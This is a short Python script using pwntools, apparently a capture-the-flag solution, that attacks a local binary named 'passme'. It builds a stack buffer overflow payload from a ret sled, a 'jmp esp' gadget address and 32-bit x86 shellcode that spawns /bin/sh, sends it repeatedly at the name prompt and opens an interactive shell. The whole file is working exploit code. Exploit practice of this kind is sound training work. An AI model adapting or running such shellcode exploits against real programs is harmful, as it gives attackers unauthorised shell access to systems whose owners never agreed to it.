from pwn import *

shell = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
jmp_esp = 0x080490fb
ret = 0x0804900e

payload1 = p32(jmp_esp) + shell
payload = p32(ret) * ((68 - len(payload1)) // 4) + payload1
while(1):
    io = process('./passme')
    #gdb.attach(io, api=True)
    io.recvuntil(b'name:')
    io.sendline(payload)
    try:
        io.recv(timeout=0.5)
    except:
        io.close()
    io.interactive()